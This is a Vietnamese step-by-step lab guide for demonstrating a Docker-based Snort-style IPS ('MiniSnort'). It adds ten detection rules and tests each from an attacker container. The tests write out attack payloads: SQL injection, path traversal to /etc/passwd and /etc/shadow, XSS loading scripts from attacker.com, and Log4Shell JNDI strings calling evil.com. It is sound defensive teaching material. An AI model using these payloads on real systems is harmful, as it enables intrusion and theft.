# Hướng Dẫn Demo Từng Rule MiniSnort IPS

## Bắt Đầu Từ File Rules Trống

---

## 📋 Chuẩn Bị

### 1. Khởi động hệ thống

```bash
# Start tất cả containers
docker compose up -d

# Kiểm tra services đang chạy
docker ps
```

### 2. Tạo file rules trống

```bash
# Backup file rules hiện tại
sudo cp config/rules/local.rules config/rules/local.rules.backup

# Tạo file trống
sudo truncate -s 0 config/rules/local.rules

# Hoặc tạo file mới với header
sudo bash -c 'cat > config/rules/local.rules << EOF
# MiniSnort IPS Rules - Demo từ đầu
# File: config/rules/local.rules
# Ngày tạo: $(date +%Y-%m-%d)

EOF'
```

### 3. Restart IPS để load rules mới

```bash
docker restart ms_ips
sleep 3
docker logs ms_ips --tail 20
```

### 4. Mở Dashboard

```bash
# Truy cập: http://127.0.0.1:8080
firefox http://127.0.0.1:8080 &
```

### 5. Mở terminal attacker

**Cách 1: Vào container attacker (khuyên dùng cho demo)**

```bash
# Vào container attacker
docker exec -it ms_attacker bash

# Giờ bạn đang ở trong container, prompt sẽ là: root@attacker:/#
# Chạy các lệnh tấn công trực tiếp từ đây
```

**Cách 2: Chạy lệnh từ bên ngoài (không cần vào container)**

```bash
# Chạy từng lệnh với docker exec
docker exec ms_attacker ping -c 3 10.100.0.20
docker exec ms_attacker nmap -sS -p 1-100 10.100.0.20
```

**Lưu ý quan trọng**:

- ✅ **Nếu đã vào container (Cách 1)**: Chỉ cần gõ lệnh trực tiếp
  ```bash
  ping -c 3 10.100.0.20
  nmap -sS -p 1-100 10.100.0.20
  ```
- ❌ **Nếu chưa vào container (Cách 2)**: Phải thêm `docker exec ms_attacker` trước mỗi lệnh
  ```bash
  docker exec ms_attacker ping -c 3 10.100.0.20
  docker exec ms_attacker nmap -sS -p 1-100 10.100.0.20
  ```

**Trong hướng dẫn này, tất cả lệnh đều giả định bạn đã vào container (Cách 1)**

---

## 🎯 DEMO RULE 1: ICMP Ping Detection

### Bước 1: Test TRƯỚC KHI có rule

```bash
# Từ TRONG attacker container (đã chạy: docker exec -it ms_attacker bash)
docker exec ms_attacker ping -c 3 10.100.0.20
```

**Kết quả**: Ping thành công, KHÔNG có alert trên dashboard

### Bước 2: Thêm rule ICMP Ping Detection

```bash
# Thêm rule vào file
sudo bash -c 'cat >> config/rules/local.rules << EOF
# Rule 1: ICMP Ping Detection
alert icmp any any -> any any (msg:"ICMP Ping detected"; sid:1000001; rev:1; classtype:drop; priority:1;)
EOF'

# Restart IPS
docker restart ms_ips
sleep 3
```

### Bước 3: Giải thích rule

```snort
alert icmp any any -> any any (msg:"ICMP Ping detected"; sid:1000001; rev:1; classtype:drop; priority:1;)
```

**Phân tích**:

- `alert`: Hành động - ghi log và forward packet
- `icmp`: Protocol ICMP (ping)
- `any any`: Source IP:Port bất kỳ
- `->`: Hướng traffic
- `any any`: Destination IP:Port bất kỳ
- `msg:"ICMP Ping detected"`: Thông báo hiển thị
- `sid:1000001`: Signature ID duy nhất
- `classtype:drop`: Phân loại tấn công
- `priority:1`: Mức độ nghiêm trọng (1=cao nhất)

### Bước 4: Test SAU KHI có rule

```bash
# Từ TRONG attacker container
ping -c 3 10.100.0.20
```

**Kết quả mong đợi**:

- ✅ Dashboard hiển thị alert: "ICMP Ping detected"
- ✅ Alert details: `10.100.0.10:0 -> 10.100.0.20:0`
- ✅ Protocol: ICMP
- ✅ SID: 1000001

### Bước 5: Xem log chi tiết

```bash
# Xem alert log
docker exec ms_ips tail -f /var/log/minisnort/alert.log
```

---

## 🎯 DEMO RULE 2: TCP SYN Scan Detection

### Bước 1: Test TRƯỚC KHI có rule

```bash
# Từ TRONG attacker container
nmap -sS -p 1-100 10.100.0.20
```

**Kết quả**: Scan thành công, KHÔNG có alert

### Bước 2: Thêm rule Nmap SYN Scan

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 2: Nmap SYN Scan Detection
alert tcp any any -> any any (msg:"Nmap SYN scan detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000002; rev:1; classtype:attempted-recon; priority:2;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 3: Giải thích rule

```snort
alert tcp any any -> any any (msg:"Nmap SYN scan detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000002; rev:1; classtype:attempted-recon; priority:2;)
```

**Phân tích**:

- `tcp`: Protocol TCP
- `flags:S`: Chỉ match TCP SYN packets (không có ACK)
- `threshold:type threshold`: Kiểu ngưỡng
- `track by_src`: Theo dõi theo source IP
- `count 10, seconds 5`: Trigger khi có ≥10 SYN packets trong 5 giây
- `classtype:attempted-recon`: Phân loại trinh sát mạng

### Bước 4: Test SAU KHI có rule

```bash
# Từ TRONG attacker container
nmap -sS -p 1-100 10.100.0.20
```

**Kết quả mong đợi**:

- ✅ Alert sau khi scan ~10 ports
- ✅ Message: "Nmap SYN scan detected"
- ✅ Source: 10.100.0.10

---

## 🎯 DEMO RULE 3: SSH Brute Force Detection

### Bước 1: Thêm rule SSH Brute Force

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 3: SSH Brute Force Detection
alert tcp any any -> any 22 (msg:"SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000003; rev:1; classtype:attempted-user; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Giải thích rule

```snort
alert tcp any any -> any 22 (msg:"SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000003; rev:1; classtype:attempted-user; priority:1;)
```

**Phân tích**:

- `-> any 22`: Destination port 22 (SSH)
- `count 5, seconds 60`: Trigger khi có ≥5 connection attempts trong 60 giây
- `classtype:attempted-user`: Phân loại tấn công user account

### Bước 3: Test rule

```bash
# Từ TRONG attacker container - thử kết nối SSH nhiều lần
for i in {1..10}; do
  nc -zv 10.100.0.20 22
  sleep 1
done
```

**Kết quả mong đợi**:

- ✅ Alert sau 5 connection attempts
- ✅ Message: "SSH brute force attempt"

---

## 🎯 DEMO RULE 4: SQL Injection Detection

### Bước 1: Test TRƯỚC KHI có rule

```bash
# Từ TRONG attacker container
curl "http://10.100.0.20/login.php?id=1' UNION SELECT username,password FROM users--"
```

**Kết quả**: Request thành công, KHÔNG có alert

### Bước 2: Thêm rule SQL Injection

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 4: SQL Injection Detection
alert tcp any any -> any 80 (msg:"SQL Injection attempt detected"; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000004; rev:1; classtype:web-application-attack; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 3: Giải thích rule

```snort
alert tcp any any -> any 80 (msg:"SQL Injection attempt detected"; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000004; rev:1; classtype:web-application-attack; priority:1;)
```

**Phân tích**:

- `-> any 80`: Destination port 80 (HTTP)
- `content:"union"`: Tìm chuỗi "union" trong payload
- `nocase`: Không phân biệt hoa/thường
- `content:"select"`: Tìm chuỗi "select"
- `distance:0`: "select" phải xuất hiện ngay sau "union"
- `classtype:web-application-attack`: Phân loại tấn công web

### Bước 4: Test SAU KHI có rule

```bash
# Test 1: UNION SELECT
curl "http://10.100.0.20/login.php?id=1' UNION SELECT username,password FROM users--"

# Test 2: union select (lowercase)
curl "http://10.100.0.20/product.php?id=1 union select 1,2,3--"

# Test 3: UnIoN SeLeCt (mixed case)
curl "http://10.100.0.20/search.php?q=' UnIoN SeLeCt * FROM admin--"
```

**Kết quả mong đợi**:

- ✅ 3 alerts trên dashboard
- ✅ Message: "SQL Injection attempt detected"
- ✅ Destination: 10.100.0.20:80

---

## 🎯 DEMO RULE 5: Admin URL Access Detection

### Bước 1: Thêm rule Admin Access

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 5: Admin Panel Access Detection
alert tcp any any -> any 80 (msg:"Admin panel access attempt"; content:"/admin"; http_uri; sid:1000005; rev:1; classtype:web-application-attack; priority:2;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Giải thích rule

```snort
alert tcp any any -> any 80 (msg:"Admin panel access attempt"; content:"/admin"; http_uri; sid:1000005; rev:1; classtype:web-application-attack; priority:2;)
```

**Phân tích**:

- `content:"/admin"`: Tìm chuỗi "/admin" trong request
- `http_uri`: Chỉ tìm trong URI (không tìm trong body)

### Bước 3: Test rule

```bash
# Test các URL admin khác nhau
curl http://10.100.0.20/admin/
curl http://10.100.0.20/administrator/
curl http://10.100.0.20/wp-admin/
curl http://10.100.0.20/admin.php
```

**Kết quả mong đợi**:

- ✅ 4 alerts (mỗi request 1 alert)
- ✅ Message: "Admin panel access attempt"

---

## 🎯 DEMO RULE 6: ICMP Block (DROP Action)

### Bước 1: Thêm rule ICMP Block

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 6: Block All ICMP
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000006; rev:1; classtype:drop; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Giải thích rule

```snort
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000006; rev:1; classtype:drop; priority:1;)
```

**Phân tích**:

- `drop`: Hành động DROP - chặn packet và ghi log
- Khác với `alert`: alert chỉ ghi log, drop sẽ chặn luôn

### Bước 3: Test rule

```bash
# Từ TRONG attacker container
ping -c 5 10.100.0.20
```

**Kết quả mong đợi**:

- ✅ Ping KHÔNG thành công (100% packet loss)
- ✅ Dashboard hiển thị 2 alerts:
  - "ICMP Ping detected" (SID 1000001 - alert)
  - "Block all ICMP" (SID 1000006 - drop)
- ✅ Packet bị chặn hoàn toàn

### Bước 4: So sánh alert vs drop

```bash
# Xóa rule drop để thấy sự khác biệt
sudo sed -i '/Block all ICMP/d' config/rules/local.rules
docker restart ms_ips
sleep 3

# Test lại
ping -c 3 10.100.0.20
# Kết quả: Ping THÀNH CÔNG, chỉ có alert

# Thêm lại rule drop
sudo bash -c 'cat >> config/rules/local.rules << EOF
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000006; rev:1; classtype:drop; priority:1;)
EOF'
docker restart ms_ips
sleep 3

# Test lại
ping -c 3 10.100.0.20
# Kết quả: Ping THẤT BẠI, packet bị drop
```

---

## 🎯 DEMO RULE 7: XSS Detection

### Bước 1: Thêm rule XSS

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 7: XSS Detection
alert tcp any any -> any 80 (msg:"XSS attack detected"; content:"<script"; nocase; sid:1000007; rev:1; classtype:web-application-attack; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Test rule

```bash
# Test XSS payloads
curl "http://10.100.0.20/search.php?q=<script>alert('XSS')</script>"
curl "http://10.100.0.20/comment.php?text=<SCRIPT>document.location='http://evil.com'</SCRIPT>"
curl "http://10.100.0.20/profile.php?bio=<script src='http://attacker.com/xss.js'></script>"
```

**Kết quả mong đợi**:

- ✅ 3 alerts
- ✅ Message: "XSS attack detected"

---

## 🎯 DEMO RULE 8: Directory Traversal Detection

### Bước 1: Thêm rule Directory Traversal

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 8: Directory Traversal Detection
alert tcp any any -> any 80 (msg:"Directory traversal attempt"; content:"../"; sid:1000008; rev:1; classtype:web-application-attack; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Test rule

```bash
# Test path traversal
curl "http://10.100.0.20/download.php?file=../../../../etc/passwd"
curl "http://10.100.0.20/view.php?page=../../../../../../etc/shadow"
curl "http://10.100.0.20/include.php?path=../../../config/database.php"
```

**Kết quả mong đợi**:

- ✅ 3 alerts
- ✅ Message: "Directory traversal attempt"

---

## 🎯 DEMO RULE 9: SQLMap Detection

### Bước 1: Thêm rule SQLMap

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 9: SQLMap Detection
alert tcp any any -> any 80 (msg:"SQLMap automated attack detected"; content:"User-Agent|3a| sqlmap"; sid:1000009; rev:1; classtype:web-application-attack; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Giải thích rule

```snort
alert tcp any any -> any 80 (msg:"SQLMap automated attack detected"; content:"User-Agent|3a| sqlmap"; sid:1000009; rev:1; classtype:web-application-attack; priority:1;)
```

**Phân tích**:

- `content:"User-Agent|3a| sqlmap"`: Tìm "User-Agent: sqlmap"
- `|3a|`: Hex code cho dấu `:` (colon)

### Bước 3: Test rule

```bash
# Test với SQLMap User-Agent
curl -A "sqlmap/1.6.12" http://10.100.0.20/
curl -A "sqlmap/1.0" http://10.100.0.20/login.php
```

**Kết quả mong đợi**:

- ✅ 2 alerts
- ✅ Message: "SQLMap automated attack detected"

---

## 🎯 DEMO RULE 10: Log4Shell (CVE-2021-44228)

### Bước 1: Thêm rule Log4Shell

```bash
sudo bash -c 'cat >> config/rules/local.rules << EOF

# Rule 10: Log4Shell Detection
alert tcp any any -> any any (msg:"Log4Shell exploit attempt (CVE-2021-44228)"; content:"\${jndi:"; nocase; sid:1000010; rev:1; classtype:attempted-admin; priority:1;)
EOF'

docker restart ms_ips
sleep 3
```

### Bước 2: Giải thích rule

```snort
alert tcp any any -> any any (msg:"Log4Shell exploit attempt (CVE-2021-44228)"; content:"${jndi:"; nocase; sid:1000010; rev:1; classtype:attempted-admin; priority:1;)
```

**Phân tích**:

- `content:"${jndi:"`: Pattern đặc trưng của Log4Shell
- `-> any any`: Áp dụng cho mọi port (vì Log4j có thể ở bất kỳ đâu)
- `classtype:attempted-admin`: Phân loại tấn công nghiêm trọng
- `priority:1`: Mức độ cao nhất

### Bước 3: Test rule

```bash
# Test Log4Shell payloads
curl -H "X-Api-Version: \${jndi:ldap://evil.com/Exploit}" http://10.100.0.20/api/v1/status
curl -H "User-Agent: \${jndi:ldap://attacker.com/a}" http://10.100.0.20/
curl "http://10.100.0.20/search?q=\${jndi:rmi://malicious.com/Evil}"
```

**Kết quả mong đợi**:

- ✅ 3 alerts
- ✅ Message: "Log4Shell exploit attempt (CVE-2021-44228)"
- ✅ Priority: 1 (cao nhất)

---

## 📊 Tổng Kết & Kiểm Tra

### 1. Xem tất cả rules đã thêm

```bash
sudo cat config/rules/local.rules
```

### 2. Đếm số rules

```bash
grep -c "^alert\|^drop" config/rules/local.rules
```

### 3. Xem tất cả alerts

```bash
docker exec ms_ips cat /var/log/minisnort/alert.log
```

### 4. Thống kê alerts theo SID

```bash
docker exec ms_ips cat /var/log/minisnort/alert.log | grep -oP 'sid:\d+' | sort | uniq -c
```

### 5. Dashboard API

```bash
curl -s http://127.0.0.1:8080/api/alerts/live | python3 -m json.tool
```

---

## 🎬 Script Tự Động Demo Tất Cả Rules

**Lưu ý**: Script này chạy từ BÊN NGOÀI container (dùng `docker exec`), không cần vào attacker container.

### Tạo script demo tự động

```bash
cat > demo_all_rules.sh << 'EOF'
#!/bin/bash
set -e

echo "=== DEMO TẤT CẢ RULES ==="
echo "Script này tự động chạy tất cả test từ BÊN NGOÀI container"
echo ""

# Rule 1: ICMP Ping
echo "[1/10] Testing ICMP Ping..."
docker exec ms_attacker ping -c 2 10.100.0.20 || true
sleep 2

# Rule 2: Nmap SYN Scan
echo "[2/10] Testing Nmap SYN Scan..."
docker exec ms_attacker nmap -sS -p 1-50 10.100.0.20 || true
sleep 2

# Rule 3: SSH Brute Force
echo "[3/10] Testing SSH Brute Force..."
for i in {1..6}; do docker exec ms_attacker nc -zv 10.100.0.20 22 2>&1; sleep 1; done
sleep 2

# Rule 4: SQL Injection
echo "[4/10] Testing SQL Injection..."
docker exec ms_attacker curl -s "http://10.100.0.20/login.php?id=1' UNION SELECT 1,2,3--" > /dev/null
sleep 2

# Rule 5: Admin Access
echo "[5/10] Testing Admin Access..."
docker exec ms_attacker curl -s http://10.100.0.20/admin/ > /dev/null
sleep 2

# Rule 6: ICMP Block (already tested in rule 1)
echo "[6/10] ICMP Block (tested with rule 1)"

# Rule 7: XSS
echo "[7/10] Testing XSS..."
docker exec ms_attacker curl -s "http://10.100.0.20/search.php?q=<script>alert('XSS')</script>" > /dev/null
sleep 2

# Rule 8: Directory Traversal
echo "[8/10] Testing Directory Traversal..."
docker exec ms_attacker curl -s "http://10.100.0.20/download.php?file=../../../../etc/passwd" > /dev/null
sleep 2

# Rule 9: SQLMap
echo "[9/10] Testing SQLMap..."
docker exec ms_attacker curl -s -A "sqlmap/1.0" http://10.100.0.20/ > /dev/null
sleep 2

# Rule 10: Log4Shell
echo "[10/10] Testing Log4Shell..."
docker exec ms_attacker curl -s -H "X-Api-Version: \${jndi:ldap://evil.com/a}" http://10.100.0.20/ > /dev/null
sleep 2

echo ""
echo "=== DEMO HOÀN TẤT ==="
echo "Kiểm tra dashboard: http://127.0.0.1:8080"
echo ""
echo "Xem alerts:"
docker exec ms_ips tail -20 /var/log/minisnort/alert.log
EOF

chmod +x demo_all_rules.sh
```

### Chạy script

```bash
./demo_all_rules.sh
```

---

## 📝 Checklist Demo

### Trước khi demo:

- [ ] `docker compose up -d` - Start containers
- [ ] `sudo truncate -s 0 config/rules/local.rules` - Tạo file rules trống
- [ ] `docker restart ms_ips` - Restart IPS
- [ ] `firefox http://127.0.0.1:8080` - Mở dashboard
- [ ] **`docker exec -it ms_attacker bash`** - **VÀO attacker container (QUAN TRỌNG!)**
  - Sau khi chạy lệnh này, bạn sẽ thấy prompt: `root@attacker:/#`
  - Tất cả lệnh demo sau đây chạy TỪ TRONG container này

### Trong demo:

- [ ] Demo từng rule một theo thứ tự
- [ ] Giải thích cú pháp rule trước khi test
- [ ] Test TRƯỚC và SAU khi thêm rule
- [ ] Highlight alerts trên dashboard real-time
- [ ] So sánh `alert` vs `drop` action
- [ ] **Nhớ**: Tất cả lệnh tấn công chạy từ TRONG attacker container

### Sau demo:

- [ ] Show tất cả rules: `sudo cat config/rules/local.rules`
- [ ] Show tất cả alerts: `docker exec ms_ips cat /var/log/minisnort/alert.log`
- [ ] Thống kê: `grep -c "^alert\|^drop" config/rules/local.rules`
- [ ] Q&A session

---

## 🎯 File Rules Hoàn Chỉnh

Sau khi demo xong, file `config/rules/local.rules` sẽ có nội dung:

```snort
# MiniSnort IPS Rules - Demo từ đầu
# File: config/rules/local.rules

# Rule 1: ICMP Ping Detection
alert icmp any any -> any any (msg:"ICMP Ping detected"; sid:1000001; rev:1; classtype:drop; priority:1;)

# Rule 2: Nmap SYN Scan Detection
alert tcp any any -> any any (msg:"Nmap SYN scan detected"; flags:S; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000002; rev:1; classtype:attempted-recon; priority:2;)

# Rule 3: SSH Brute Force Detection
alert tcp any any -> any 22 (msg:"SSH brute force attempt"; flags:S; threshold:type threshold, track by_src, count 5, seconds 60; sid:1000003; rev:1; classtype:attempted-user; priority:1;)

# Rule 4: SQL Injection Detection
alert tcp any any -> any 80 (msg:"SQL Injection attempt detected"; content:"union"; nocase; content:"select"; nocase; distance:0; sid:1000004; rev:1; classtype:web-application-attack; priority:1;)

# Rule 5: Admin Panel Access Detection
alert tcp any any -> any 80 (msg:"Admin panel access attempt"; content:"/admin"; http_uri; sid:1000005; rev:1; classtype:web-application-attack; priority:2;)

# Rule 6: Block All ICMP
drop icmp any any -> any any (msg:"Block all ICMP"; sid:1000006; rev:1; classtype:drop; priority:1;)

# Rule 7: XSS Detection
alert tcp any any -> any 80 (msg:"XSS attack detected"; content:"<script"; nocase; sid:1000007; rev:1; classtype:web-application-attack; priority:1;)

# Rule 8: Directory Traversal Detection
alert tcp any any -> any 80 (msg:"Directory traversal attempt"; content:"../"; sid:1000008; rev:1; classtype:web-application-attack; priority:1;)

# Rule 9: SQLMap Detection
alert tcp any any -> any 80 (msg:"SQLMap automated attack detected"; content:"User-Agent|3a| sqlmap"; sid:1000009; rev:1; classtype:web-application-attack; priority:1;)

# Rule 10: Log4Shell Detection
alert tcp any any -> any any (msg:"Log4Shell exploit attempt (CVE-2021-44228)"; content:"${jndi:"; nocase; sid:1000010; rev:1; classtype:attempted-admin; priority:1;)
```

---

## 🚀 Mở Rộng

### Thêm rules nâng cao:

- Shellshock (CVE-2014-6271)
- Heartbleed (CVE-2014-0160)
- EternalBlue (CVE-2017-0144)
- Cobalt Strike detection
- Cryptocurrency mining
- DNS tunneling

### Tham khảo:

- File: `config/rules/demo_rules.rules` - 40+ rules mẫu
- Script: `scripts/demo_rule_tests.sh` - Test tự động
- Docs: `DEMO_SCRIPT.md` - Kịch bản demo chi tiết

---

**Chúc demo thành công! 🎉**
